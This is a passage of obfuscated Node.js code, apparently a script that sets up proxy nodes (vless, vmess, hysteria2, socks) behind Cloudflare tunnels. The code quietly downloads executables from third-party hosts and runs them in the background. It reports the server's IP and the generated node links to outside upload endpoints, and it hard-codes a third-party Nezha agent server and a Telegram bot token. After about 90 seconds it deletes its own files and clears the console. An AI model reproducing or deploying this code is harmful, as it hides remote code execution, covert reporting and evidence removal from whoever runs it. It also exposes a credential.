        _0x19f5f3(_0x229663._0x1ee353) + phpPath + _0x19f5f3(_0x229663._0x30c49d) + FILE_PATH + '/config.yaml\x22\x20>/dev/null\x202>&1\x20&'
      try {
        ;(await exec(_0x5df269),
          console[_0x19f5f3(_0x229663._0x56505c)](phpName + _0x19f5f3(_0x229663._0x1a05da)),
          await new Promise((_0x471d75) => setTimeout(_0x471d75, 0x3e8)))
      } catch (_0x1f0888) {
        console[_0x19f5f3(0x1ba)](_0x19f5f3(_0x229663._0x1a01a5) + _0x1f0888)
      }
    } else {
      let _0x1ba6bc = ''
      const _0x67a1fd = [
        _0x19f5f3(_0x229663._0x3d054b),
        '8443',
        _0x19f5f3(_0x229663._0x475e10),
        _0x19f5f3(0x252),
        _0x19f5f3(_0x229663._0xccf68e),
        _0x19f5f3(0x273)
      ]
      _0x67a1fd[_0x19f5f3(_0x229663._0xf93e3b)](NEZHA_PORT) && (_0x1ba6bc = _0x19f5f3(_0x229663._0xc8967))
      const _0x3c1abe =
        _0x19f5f3(_0x229663._0x5866a) +
        npmPath +
        _0x19f5f3(0x1c7) +
        NEZHA_SERVER +
        ':' +
        NEZHA_PORT +
        _0x19f5f3(0x237) +
        NEZHA_KEY +
        '\x20' +
        _0x1ba6bc +
        _0x19f5f3(_0x229663._0x3afeed)
      try {
        ;(await exec(_0x3c1abe), console['log'](npmName + '\x20is\x20running'), await new Promise((_0x3a0d5a) => setTimeout(_0x3a0d5a, 0x3e8)))
      } catch (_0x9c15fe) {
        console[_0x19f5f3(0x1ba)]('npm\x20running\x20error:\x20' + _0x9c15fe)
      }
    }
  } else console['log'](_0x19f5f3(_0x229663._0x3857fd))
  const _0x18d01c = _0x19f5f3(_0x229663._0x5866a) + webPath + _0x19f5f3(0x1b0) + FILE_PATH + '/config.json\x20>/dev/null\x202>&1\x20&'
  try {
    ;(await exec(_0x18d01c),
      console[_0x19f5f3(0x1e6)](webName + _0x19f5f3(_0x229663._0x3f00d9)),
      await new Promise((_0x206549) => setTimeout(_0x206549, 0x3e8)))
  } catch (_0xeea32c) {
    console[_0x19f5f3(_0x229663._0x258349)](_0x19f5f3(_0x229663._0x46e33d) + _0xeea32c)
  }
  if (fs[_0x19f5f3(_0x229663._0x2fe6c1)](botPath)) {
    let _0x47c617
    if (ARGO_AUTH[_0x19f5f3(_0x229663._0x54e3c5)](/^[A-Z0-9a-z=]{120,250}$/)) _0x47c617 = _0x19f5f3(_0x229663._0x17ec89) + ARGO_AUTH
    else
      ARGO_AUTH[_0x19f5f3(_0x229663._0x54e3c5)](/TunnelSecret/)
        ? (_0x47c617 = _0x19f5f3(_0x229663._0x20406e) + path[_0x19f5f3(0x1e5)](FILE_PATH, _0x19f5f3(_0x229663._0x227a80)) + _0x19f5f3(0x1a6))
        : (_0x47c617 = _0x19f5f3(0x199) + path[_0x19f5f3(0x1e5)](bootLogPath) + _0x19f5f3(_0x229663._0x22795c) + ARGO_PORT)
    try {
      ;(await exec(_0x19f5f3(0x258) + path[_0x19f5f3(0x1e5)](botPath) + '\x22\x20' + _0x47c617 + _0x19f5f3(0x1a4)),
        console[_0x19f5f3(0x1e6)](botName + _0x19f5f3(_0x229663._0x3f00d9)),
        await new Promise((_0x4d0420) => setTimeout(_0x4d0420, 0x7d0)))
    } catch (_0x337a82) {
      console[_0x19f5f3(_0x229663._0x1cc1ce)](_0x19f5f3(0x1b5) + _0x337a82)
    }
  }
  await new Promise((_0x2ba068) => setTimeout(_0x2ba068, 0x1388))
}
function getFilesForArchitecture(_0x4e812d) {
  const _0x58e03d = { _0x22833f: 0x17c, _0x5810ab: 0x1e7, _0x193236: 0x1b9, _0x1e37cf: 0x262, _0x4e75a7: 0x19e, _0x53e387: 0x19e },
    _0x2612fc = _0x238ceb,
    _0x168dac = _0x4e812d === _0x2612fc(0x17c) ? _0x2612fc(0x18b) : 'https://amd64.oooen.com',
    _0x581a9d = _0x4e812d === _0x2612fc(_0x58e03d._0x22833f) ? 'https://arm64.ssss.nyc.mn' : _0x2612fc(0x222),
    _0x418cf7 = [
      { fileName: webPath, fileUrls: [_0x168dac + '/web', _0x581a9d + _0x2612fc(_0x58e03d._0x5810ab)] },
      { fileName: botPath, fileUrls: [_0x168dac + _0x2612fc(_0x58e03d._0x193236), _0x581a9d + _0x2612fc(0x1b9)] }
    ]
  return (
    NEZHA_SERVER &&
      NEZHA_KEY &&
      (NEZHA_PORT
        ? _0x418cf7['unshift']({
            fileName: npmPath,
            fileUrls: [_0x168dac + _0x2612fc(_0x58e03d._0x1e37cf), _0x581a9d + _0x2612fc(_0x58e03d._0x1e37cf)]
          })
        : _0x418cf7[_0x2612fc(0x18c)]({
            fileName: phpPath,
            fileUrls: [_0x168dac + _0x2612fc(_0x58e03d._0x4e75a7), _0x581a9d + _0x2612fc(_0x58e03d._0x53e387)]
          })),
    _0x418cf7
  )
}
function argoType() {
  const _0x1c920 = { _0x400c3c: 0x1e6, _0x469c91: 0x20c, _0x4176c0: 0x1dc, _0x32a688: 0x1a1, _0x54a500: 0x1c5, _0x4aba00: 0x201, _0x2833c: 0x25a },
    _0x25414f = _0x238ceb
  if (!ARGO_AUTH || !ARGO_DOMAIN) {
    console[_0x25414f(_0x1c920._0x400c3c)](_0x25414f(_0x1c920._0x469c91))
    return
  }
  if (ARGO_AUTH[_0x25414f(0x1b4)](_0x25414f(_0x1c920._0x4176c0))) {
    fs[_0x25414f(0x25a)](path[_0x25414f(_0x1c920._0x32a688)](FILE_PATH, _0x25414f(_0x1c920._0x54a500)), ARGO_AUTH)
    const _0x2e04e7 =
      '\x0a\x20\x20tunnel:\x20' +
      ARGO_AUTH[_0x25414f(0x1c8)]('\x22')[0xb] +
      _0x25414f(0x175) +
      path[_0x25414f(_0x1c920._0x32a688)](FILE_PATH, _0x25414f(0x1c5)) +
      '\x0a\x20\x20protocol:\x20http2\x0a\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20' +
      ARGO_DOMAIN +
      _0x25414f(_0x1c920._0x4aba00) +
      ARGO_PORT +
      _0x25414f(0x263)
    fs[_0x25414f(_0x1c920._0x2833c)](path['join'](FILE_PATH, _0x25414f(0x278)), _0x2e04e7)
  } else console['log'](_0x25414f(0x19c) + ARGO_PORT + _0x25414f(0x1e8))
}
async function waitForQuickTunnelLog(_0x131473 = 0x7530) {
  const _0x20bf5a = { _0x2d2ab6: 0x25e, _0x3850c1: 0x181, _0x1f74fb: 0x1d4 },
    _0x1d021b = _0x238ceb,
    _0x4cb88a = Date['now']() + _0x131473
  while (Date['now']() < _0x4cb88a) {
    try {
      if (fs[_0x1d021b(_0x20bf5a._0x2d2ab6)](bootLogPath)) {
        const _0x2d40fd = fs['readFileSync'](bootLogPath, _0x1d021b(_0x20bf5a._0x3850c1))
        if (/trycloudflare\.com/[_0x1d021b(_0x20bf5a._0x1f74fb)](_0x2d40fd)) return _0x2d40fd
      }
    } catch (_0x553221) {}
    await new Promise((_0x6e3e32) => setTimeout(_0x6e3e32, 0x3e8))
  }
  return ''
}
async function extractDomains() {
  const _0x131936 = {
      _0x34a4c1: 0x1c8,
      _0x14b6b7: 0x1e3,
      _0x5353ac: 0x1cd,
      _0x977218: 0x1e6,
      _0xc80a8f: 0x1e6,
      _0x52edd4: 0x221,
      _0x54e04c: 0x1ea,
      _0x46320c: 0x199,
      _0xcdd46a: 0x26c,
      _0x5a3264: 0x258,
      _0x2674b3: 0x1e5,
      _0x5d093f: 0x19f,
      _0x1997d3: 0x215
    },
    _0x487975 = { _0x804ad1: 0x1cf, _0x18d772: 0x1bd, _0x2bcbb3: 0x1f3, _0x553528: 0x190 },
    _0x22c3bf = { _0x2f5ce2: 0x1e0 },
    _0x30c978 = _0x238ceb
  let _0x17466e
  if (ARGO_AUTH && ARGO_DOMAIN) ((_0x17466e = ARGO_DOMAIN), console[_0x30c978(0x1e6)]('ARGO_DOMAIN:', _0x17466e), await generateLinks(_0x17466e))
  else
    try {
      const _0x38cb49 = await waitForQuickTunnelLog(),
        _0x213c28 = _0x38cb49[_0x30c978(_0x131936._0x34a4c1)]('\x0a'),
        _0x4395e7 = []
      _0x213c28[_0x30c978(_0x131936._0x14b6b7)]((_0x292f0e) => {
        const _0x1bed6b = _0x30c978,
          _0x32a44f = _0x292f0e['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/)
        if (_0x32a44f) {
          const _0x555b8c = _0x32a44f[0x1]
          _0x4395e7[_0x1bed6b(_0x22c3bf._0x2f5ce2)](_0x555b8c)
        }
      })
      if (_0x4395e7[_0x30c978(_0x131936._0x5353ac)] > 0x0)
        ((_0x17466e = _0x4395e7[0x0]), console[_0x30c978(_0x131936._0x977218)](_0x30c978(0x17d), _0x17466e), await generateLinks(_0x17466e))
      else {
        ;(console[_0x30c978(_0x131936._0xc80a8f)](_0x30c978(_0x131936._0x52edd4)),
          fs[_0x30c978(0x233)](path['join'](FILE_PATH, _0x30c978(_0x131936._0x54e04c))))
        async function _0x26d571() {
          const _0x5aa14d = _0x30c978
          try {
            process[_0x5aa14d(0x259)] === _0x5aa14d(_0x487975._0x804ad1)
              ? await exec(_0x5aa14d(0x209) + botName + _0x5aa14d(0x239))
              : await exec(
                  _0x5aa14d(_0x487975._0x18d772) +
                    botName[_0x5aa14d(_0x487975._0x2bcbb3)](0x0) +
                    ']' +
                    botName[_0x5aa14d(_0x487975._0x553528)](0x1) +
                    _0x5aa14d(0x25b)
                )
          } catch (_0x1debf3) {}
        }
        ;(_0x26d571(), await new Promise((_0x2a6fb7) => setTimeout(_0x2a6fb7, 0xbb8)))
        const _0x49c176 = _0x30c978(_0x131936._0x46320c) + path[_0x30c978(0x1e5)](bootLogPath) + _0x30c978(_0x131936._0xcdd46a) + ARGO_PORT
        try {
          ;(await exec(
            _0x30c978(_0x131936._0x5a3264) + path[_0x30c978(_0x131936._0x2674b3)](botPath) + '\x22\x20' + _0x49c176 + '\x20>/dev/null\x202>&1\x20&'
          ),
            console[_0x30c978(0x1e6)](botName + _0x30c978(_0x131936._0x5d093f)),
            await new Promise((_0x5c5aa8) => setTimeout(_0x5c5aa8, 0x1770)),
            await extractDomains())
        } catch (_0x43bef4) {
          console[_0x30c978(0x1ba)]('Error\x20executing\x20command:\x20' + _0x43bef4)
        }
      }
    } catch (_0x149743) {
      console[_0x30c978(0x1ba)](_0x30c978(_0x131936._0x1997d3), _0x149743)
    }
}
async function getMetaInfo() {
  const _0x494160 = {
      _0x307436: 0x1df,
      _0x1d8148: 0x210,
      _0x5df85e: 0x270,
      _0x2af038: 0x285,
      _0x5f1548: 0x172,
      _0x2eba1e: 0x210,
      _0x4a75cc: 0x1fd,
      _0x4a3cb8: 0x220,
      _0x36abd7: 0x1ee
    },
    _0x5ea5bf = _0x238ceb
  try {
    const _0x50aead = await axios[_0x5ea5bf(0x1a2)](_0x5ea5bf(0x1de), { headers: { 'User-Agent': 'Mozilla/5.0', timeout: 0xbb8 } })
    if (_0x50aead['data'] && _0x50aead[_0x5ea5bf(0x210)][_0x5ea5bf(_0x494160._0x307436)] && _0x50aead[_0x5ea5bf(0x210)][_0x5ea5bf(0x18f)])
      return (_0x50aead[_0x5ea5bf(_0x494160._0x1d8148)]['country_code'] + '-' + _0x50aead[_0x5ea5bf(0x210)]['isp'])[_0x5ea5bf(0x220)](/\s+/g, '_')
  } catch (_0x553645) {
    try {
      const _0x2c3cc9 = await axios[_0x5ea5bf(0x1a2)](_0x5ea5bf(_0x494160._0x5df85e), {
        headers: { 'User-Agent': _0x5ea5bf(_0x494160._0x2af038), timeout: 0xbb8 }
      })
      if (
        _0x2c3cc9[_0x5ea5bf(0x210)] &&
        _0x2c3cc9['data'][_0x5ea5bf(0x20b)] === 'success' &&
        _0x2c3cc9[_0x5ea5bf(0x210)][_0x5ea5bf(_0x494160._0x5f1548)] &&
        _0x2c3cc9[_0x5ea5bf(_0x494160._0x2eba1e)][_0x5ea5bf(_0x494160._0x4a75cc)]
      )
        return (_0x2c3cc9[_0x5ea5bf(_0x494160._0x2eba1e)]['countryCode'] + '-' + _0x2c3cc9[_0x5ea5bf(0x210)]['org'])[_0x5ea5bf(_0x494160._0x4a3cb8)](
          /\s+/g,
          '_'
        )
    } catch (_0x46e7e6) {}
  }
  return _0x5ea5bf(_0x494160._0x36abd7)
}
async function getServerIP() {
  const _0x19b8e4 = { _0x16ee96: 0x210, _0x1462eb: 0x23d, _0x195e43: 0x23d, _0x180269: 0x246 },
    _0x35da6d = _0x238ceb
  let _0x4d4c80 = ''
  try {
    const _0x1aacfb = await axios['get'](_0x35da6d(0x1d0), { timeout: 0xbb8 })
    _0x4d4c80 = _0x1aacfb[_0x35da6d(_0x19b8e4._0x16ee96)][_0x35da6d(_0x19b8e4._0x1462eb)]()
  } catch (_0x3a190d) {
    try {
      _0x4d4c80 = execSync('curl\x20-sm\x203\x20ipv4.ip.sb')[_0x35da6d(0x1d9)]()['trim']()
    } catch (_0xa159d2) {
      try {
        const _0x166f17 = await axios['get'](_0x35da6d(0x185), { timeout: 0xbb8 })
        _0x4d4c80 = '[' + _0x166f17['data']['trim']() + ']'
      } catch (_0x173efd) {
        try {
          _0x4d4c80 = '[' + execSync(_0x35da6d(0x179))[_0x35da6d(0x1d9)]()[_0x35da6d(_0x19b8e4._0x195e43)]() + ']'
        } catch (_0x4a9fee) {
          console[_0x35da6d(0x1ba)](_0x35da6d(0x22f), _0x4a9fee[_0x35da6d(_0x19b8e4._0x180269)])
        }
      }
    }
  }
  return _0x4d4c80
}
async function generateLinks(_0x1639b5) {
  const _0x1b3816 = await getMetaInfo(),
    _0x558895 = NAME ? NAME + '-' + _0x1b3816 : _0x1b3816,
    _0x8a4e65 = await getServerIP()
  return new Promise((_0x155e25) => {
    const _0x4139dc = {
      _0x5ccd7b: 0x23c,
      _0xe2f287: 0x22e,
      _0x132688: 0x1f2,
      _0x23af2e: 0x21c,
      _0x1f2c87: 0x1d9,
      _0x8db6b: 0x26e,
      _0x17d422: 0x198,
      _0x3adb9e: 0x283,
      _0x1dd112: 0x1a8,
      _0x3da8e5: 0x1f2,
      _0x59060f: 0x25a,
      _0x37a152: 0x1e6
    }
    setTimeout(() => {
      const _0x5022a1 = _0x3e1d,
        _0x587bfa = {
          v: '2',
          ps: '' + _0x558895,
          add: CFIP,
          port: CFPORT,
          id: UUID,
          aid: '0',
          scy: _0x5022a1(0x1ca),
          net: 'ws',
          type: _0x5022a1(0x206),
          host: _0x1639b5,
          path: _0x5022a1(_0x4139dc._0x5ccd7b),
          tls: _0x5022a1(0x241),
          sni: _0x1639b5,
          alpn: '',
          fp: 'firefox'
        }
      let _0x562553 =
        '\x0avless://' +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        '?encryption=none&security=tls&sni=' +
        _0x1639b5 +
        _0x5022a1(0x1d5) +
        _0x1639b5 +
        '&path=%2Fvless-argo%3Fed%3D2560#' +
        _0x558895 +
        _0x5022a1(_0x4139dc._0xe2f287) +
        Buffer[_0x5022a1(_0x4139dc._0x132688)](JSON[_0x5022a1(_0x4139dc._0x23af2e)](_0x587bfa))[_0x5022a1(_0x4139dc._0x1f2c87)](
          _0x5022a1(_0x4139dc._0x8db6b)
        ) +
        _0x5022a1(0x1c1) +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        _0x5022a1(0x20f) +
        _0x1639b5 +
        '&fp=firefox&type=ws&host=' +
        _0x1639b5 +
        _0x5022a1(_0x4139dc._0x17d422) +
        _0x558895 +
        _0x5022a1(0x19a)
      if (isValidPort(HY2_PORT)) {
        const _0x5a16d9 = getCertificateFingerprint(certPath),
          _0x323e2c = _0x5a16d9 ? _0x5022a1(_0x4139dc._0x3adb9e) + encodeURIComponent(_0x5a16d9) : '',
          _0x733d22 = '\x0ahysteria2://' + UUID + '@' + _0x8a4e65 + ':' + HY2_PORT + _0x5022a1(0x194) + _0x323e2c + '#' + _0x558895
        _0x562553 += _0x733d22
      }
      if (isValidPort(REALITY_PORT)) {
        const _0x42bc78 =
          _0x5022a1(_0x4139dc._0x1dd112) +
          UUID +
          '@' +
          _0x8a4e65 +
          ':' +
          REALITY_PORT +
          _0x5022a1(0x205) +
          publicKey +
          '&type=tcp&headerType=none#' +
          _0x558895
        _0x562553 += _0x42bc78
      }
      if (isValidPort(S5_PORT)) {
        const _0x23206d = Buffer[_0x5022a1(0x1f2)](UUID[_0x5022a1(0x190)](0x0, 0x8) + ':' + UUID[_0x5022a1(0x279)](-0xc))['toString'](
            _0x5022a1(0x26e)
          ),
          _0x470d46 = '\x0asocks://' + _0x23206d + '@' + _0x8a4e65 + ':' + S5_PORT + '#' + _0x558895
        _0x562553 += _0x470d46
      }
      ;(console[_0x5022a1(0x1e6)](Buffer[_0x5022a1(_0x4139dc._0x3da8e5)](_0x562553)[_0x5022a1(0x1d9)](_0x5022a1(0x26e))),
        fs['writeFileSync'](subPath, Buffer[_0x5022a1(0x1f2)](_0x562553)['toString'](_0x5022a1(0x26e))),
        fs[_0x5022a1(_0x4139dc._0x59060f)](listPath, _0x562553, _0x5022a1(0x23b)),
        console[_0x5022a1(_0x4139dc._0x37a152)](FILE_PATH + '/sub.txt\x20saved\x20successfully'),
        (subContent = Buffer[_0x5022a1(0x1f2)](_0x562553)[_0x5022a1(0x1d9)](_0x5022a1(0x26e))),
        uploadNodes(),
        _0x155e25(_0x562553))
    }, 0x7d0)
  })
}
async function uploadNodes() {
  const _0x331dfe = {
      _0x36dbbd: 0x1c4,
      _0x14333a: 0x20b,
      _0x2d3751: 0x1e6,
      _0x5b8f8d: 0x1bb,
      _0x19fb6b: 0x1f6,
      _0x1410dc: 0x192,
      _0x1d4c7f: 0x181,
      _0x479427: 0x1c8,
      _0x5582ac: 0x21c,
      _0x21f9ef: 0x1c4,
      _0x43c2c3: 0x1c0,
      _0x370499: 0x170
    },
    _0x112902 = _0x238ceb
  if (UPLOAD_URL && PROJECT_URL) {
    const _0x4a34a8 = PROJECT_URL + '/' + SUB_PATH,
      _0x4fb51e = { subscription: [_0x4a34a8] }
    try {
      const _0x3870c8 = await axios[_0x112902(_0x331dfe._0x36dbbd)](UPLOAD_URL + '/api/add-subscriptions', _0x4fb51e, {
        headers: { 'Content-Type': 'application/json' }
      })
      return _0x3870c8 && _0x3870c8[_0x112902(_0x331dfe._0x14333a)] === 0xc8
        ? (console[_0x112902(_0x331dfe._0x2d3751)](_0x112902(_0x331dfe._0x5b8f8d)), _0x3870c8)
        : null
    } catch (_0x26d52e) {
      if (_0x26d52e[_0x112902(_0x331dfe._0x19fb6b)]) {
        if (_0x26d52e[_0x112902(0x1f6)]['status'] === 0x190) {
        }
      }
    }
  } else {
    if (UPLOAD_URL) {
      if (!fs['existsSync'](listPath)) return
      const _0x11eb7c = fs[_0x112902(_0x331dfe._0x1410dc)](listPath, _0x112902(_0x331dfe._0x1d4c7f)),
        _0xc4ab31 = _0x11eb7c[_0x112902(_0x331dfe._0x479427)]('\x0a')[_0x112902(0x1ce)]((_0x144a3e) =>
          /(vless|vmess|trojan|hysteria2|socks):\/\//[_0x112902(0x1d4)](_0x144a3e)
        )
      if (_0xc4ab31[_0x112902(0x1cd)] === 0x0) return
      const _0x5eb02e = JSON[_0x112902(_0x331dfe._0x5582ac)]({ nodes: _0xc4ab31 })
      try {
        const _0x35cee8 = await axios[_0x112902(_0x331dfe._0x21f9ef)](UPLOAD_URL + _0x112902(_0x331dfe._0x43c2c3), _0x5eb02e, {
          headers: { 'Content-Type': _0x112902(0x250) }
        })
        return _0x35cee8 && _0x35cee8[_0x112902(0x20b)] === 0xc8 ? (console[_0x112902(0x1e6)](_0x112902(_0x331dfe._0x370499)), _0x35cee8) : null
      } catch (_0x2ec6a9) {
        return null
      }
    } else return
  }
}
function cleanFiles() {
  const _0x4f294f = { _0x182c11: 0x1e0, _0xd9738a: 0x1cf, _0x16602e: 0x1a1, _0x27a1ce: 0x224 }
  setTimeout(() => {
    const _0x37a1bc = _0x3e1d,
      _0xe6e348 = [bootLogPath, configPath, webPath, botPath, listPath, certPath, keyPath]
    if (NEZHA_PORT) _0xe6e348[_0x37a1bc(_0x4f294f._0x182c11)](npmPath)
    else NEZHA_SERVER && NEZHA_KEY && _0xe6e348[_0x37a1bc(0x1e0)](phpPath)
    process[_0x37a1bc(0x259)] === _0x37a1bc(_0x4f294f._0xd9738a)
      ? exec(_0x37a1bc(0x1fe) + _0xe6e348[_0x37a1bc(_0x4f294f._0x16602e)]('\x20') + '\x20>\x20nul\x202>&1', (_0x4e70e3) => {
          const _0xd0dc62 = _0x37a1bc
          ;(console['clear'](), alwaysLog(_0xd0dc62(0x1f4)), console[_0xd0dc62(0x1e6)](_0xd0dc62(0x193)))
        })
      : exec(_0x37a1bc(_0x4f294f._0x27a1ce) + _0xe6e348[_0x37a1bc(_0x4f294f._0x16602e)]('\x20') + _0x37a1bc(0x27a), (_0x30d81b) => {
          const _0x324d29 = _0x37a1bc
          ;(console[_0x324d29(0x208)](), alwaysLog(_0x324d29(0x1f4)), console[_0x324d29(0x1e6)](_0x324d29(0x193)))
        })
  }, 0x15f90)
}
cleanFiles()
function _0x41d4() {
  const _0x270517 = [
    'PrivateKey:\x20',
    'all',
    'Public\x20Key:',
    '\x22\x20--loglevel\x20info\x20--url\x20http://localhost:',
    'infrlo.933993.xyz',
    'base64',
    'BggqhkjOPQMBBw==\x0a',
    'http://ip-api.com/json',
    'renameSync',
    'ARGO_PORT',
    '2053',
    'crypto',
    'nohup\x20',
    'sub.txt',
    '800',
    'tunnel.yml',
    'slice',
    '\x20>/dev/null\x202>&1',
    'Skipping\x20adding\x20automatic\x20access\x20task',
    'env',
    'vless-ws-in',
    'fileName',
    'close',
    '3SFjDei',
    'EzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\x0a',
    'disable',
    '&pinSHA256=',
    'tcp',
    'Mozilla/5.0',
    'Error\x20in\x20startserver:',
    'Nodes\x20uploaded\x20successfully',
    'publicKey',
    'countryCode',
    'Download\x20',
    '603504PDVDcI',
    '\x0a\x20\x20credentials-file:\x20',
    'proxy',
    'config.json',
    'TG\x20variables\x20is\x20empty,\x20Skipping\x20push\x20nodes\x20to\x20TG',
    'curl\x20-sm\x203\x20ipv6.ip.sb',
    'https://bing.com',
    'export',
    'arm',
    'ArgoDomain:',
    '2096',
    'Add\x20automatic\x20access\x20task\x20faild:\x20',
    'http\x20server\x20is\x20running\x20on\x20',
    'utf-8',
    'reality',
    'Not\x20Found',
    'www.iij.ad.jp',
    'http://ipv6.ip.sb',
    'x25519',
    'Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!',
    'base64url',
    '4621813GeahrF',
    'mfa.gov.ua',
    'https://arm64.oooen.com',
    'unshift',
    '--tls',
    'openssl\x20ecparam\x20-genkey\x20-name\x20prime256v1\x20-out\x20\x22',
    'isp',
    'substring',
    'quic',
    'readFileSync',
    'Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!',
    '/?sni=www.bing.com&insecure=0&alpn=h3&obfs=none',
    '/sendMessage',
    '120fxNnXm',
    'toUpperCase',
    '&path=%2Ftrojan-argo%3Fed%3D2560#',
    'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20\x22',
    '\x0a\x20\x20\x20\x20',
    'dirname',
    'Using\x20token\x20connect\x20to\x20tunnel,\x20please\x20set\x20',
    'NEZHA_SERVER',
    '/v1',
    '\x20is\x20running',
    'floor',
    'join',
    'get',
    'automatic\x20access\x20task\x20added\x20successfully',
    '\x20>/dev/null\x202>&1\x20&',
    '5838440hdLOkf',
    '\x22\x20run',
    'tunnel\x20--edge-ip-version\x20auto\x20--config\x20\x22',
    '\x0avless://',
    'S5_PORT',
    'readdirSync',
    'basename',
    'inbounds',
    'pkcs8',
    'SHOW_LOG',
    'Subscription\x20content\x20not\x20yet\x20available,\x20please\x20try\x20again\x20later.',
    '\x20-c\x20',
    'der',
    'Private\x20Key:',
    '2083',
    'includes',
    'Error\x20executing\x20command:\x20',
    '/vless-argo',
    'ARGO_DOMAIN',
    'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20',
    '/bot',
    'error',
    'Subscription\x20uploaded\x20successfully',
    '-----BEGIN\x20EC\x20PARAMETERS-----\x0a',
    'pkill\x20-f\x20\x22[',
    '8443',
    'block',
    '/api/add-nodes',
    '\x0a\x0atrojan://',
    '1139426hmLlyi',
    '\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20',
    'post',
    'tunnel.json',
    '\x5c$&',
    '\x20-s\x20',
    'split',
    'text/html;\x20charset=utf-8',
    'auto',
    'hysteria',
    'key.txt',
    'length',
    'filter',
    'win32',
    'http://ipv4.ip.sb',
    'url',
    'HY2_PORT',
    'subarray',
    'test',
    '&fp=firefox&type=ws&host=',
    '-----END\x20CERTIFICATE-----\x0a',
    'vless-fallback-in',
    'Retrying\x20',
    'toString',
    'hysteria-in',
    'nezha.933993.xyz:443',
    'TunnelSecret',
    'openssl\x20version',
    'https://api.ip.sb/geoip',
    'country_code',
    'push',
    '\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&',
    '\x0aPublicKey:\x20',
    'forEach',
    'promises',
    'resolve',
    'log',
    '/web',
    '\x20in\x20clouudflare',
    'Empowerment\x20failed\x20for\x20',
    'boot.log',
    '/dev/null',
    '```',
    'Telegram\x20message\x20sent\x20successfully',
    'Unknown',
    'UUID',
    '-----END\x20EC\x20PARAMETERS-----\x0a',
    'trojan',
    'from',
    'charAt',
    'App\x20is\x20running',
    'createHash',
    'response',
    'true',
    'util',
    '/vmess-argo',
    'fileUrls',
    'hex',
    'openssl\x20req\x20-new\x20-x509\x20-days\x203650\x20-key\x20\x22',
    'org',
    'del\x20/f\x20/q\x20',
    '7575949494',
    'stream',
    '\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:',
    '657343DggPJD',
    'SUB_PATH',
    '.npm',
    '?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=firefox&pbk=',
    'none',
    'socks',
    'clear',
    'taskkill\x20/f\x20/im\x20',
    '\x20-c\x20\x22',
    'status',
    'ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20is\x20empty,\x20use\x20quick\x20tunnels',
    '8962228750:AAGlYPI5a4FVgx0-gUbB383JirHhkuqbwRE',
    'readFile',
    '?security=tls&sni=',
    'data',
    '-----END\x20EC\x20PRIVATE\x20KEY-----\x0a',
    '\x20failed:\x20',
    'stdout',
    '443',
    'Error\x20reading\x20boot.log:',
    'MIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\x0a',
    'PORT',
    'list.txt',
    'UPLOAD_URL',
    'writeHead',
    'vmess-ws-in',
    'stringify',
    'openssl\x20x509\x20-noout\x20-fingerprint\x20-sha256\x20-in\x20\x22',
    'vless',
    'then',
    'replace',
    'ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain',
    'https://amd64.ssss.nyc.mn',
    'listen',
    'rm\x20-rf\x20',
    'Error\x20downloading\x20files:',
    'ignore',
    'child_process',
    '127.0.0.1',
    'php\x20running\x20error:\x20',
    'direct',
    '/api/delete-nodes',
    'CFPORT',
    'AwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\x0a',
    '\x0a\x0avmess://',
    'Failed\x20to\x20get\x20IP\x20address:',
    '/trojan-argo',
    'createWriteStream',
    's5-in',
    'unlinkSync',
    'BfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\x0a',
    'aarch64',
    'web\x20running\x20error:\x20',
    '\x20-p\x20',
    'amd',
    '.exe\x20>\x20nul\x202>&1',
    '\x20from\x20backup\x20source',
    'utf8',
    '/vmess-argo?ed=2560',
    'trim',
    '14632020Optpmf',
    'spki',
    'Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture',
    'tls',
    '\x20successfully',
    'arm64',
    'generateKeyPairSync',
    'NAME',
    'message',
    '26315Vnkgar',
    'end',
    'catch',
    'freedom',
    'Failed\x20to\x20send\x20Telegram\x20message:',
    'NEZHA_PORT',
    'text/plain;\x20charset=utf-8',
    'http',
    'A0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\x0a',
    'application/json',
    'false',
    '2087',
    'digest',
    'Empowerment\x20success\x20for\x20',
    '节点推送**\x0a```',
    'unlink',
    '/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\x0a',
    'nohup\x20\x22',
    'platform',
    'writeFileSync',
    '\x22\x20>\x20/dev/null\x202>&1',
    'match',
    'NEZHA\x20variable\x20is\x20empty,skip\x20running',
    'existsSync',
    'private.key',
    'js-node',
    'map',
    '/agent',
    '\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20',
    '\x22\x20-out\x20\x22',
    'xtls-rprx-vision',
    'mkdirSync',
    '-----BEGIN\x20CERTIFICATE-----\x0a',
    'NEZHA_KEY'
  ]
  _0x41d4 = function () {
    return _0x270517
  }
  return _0x41d4()
}
async function sendTelegram() {
  const _0x7bd839 = { _0x131b98: 0x23b, _0x2f0878: 0x1e6, _0x520e08: 0x1ba },
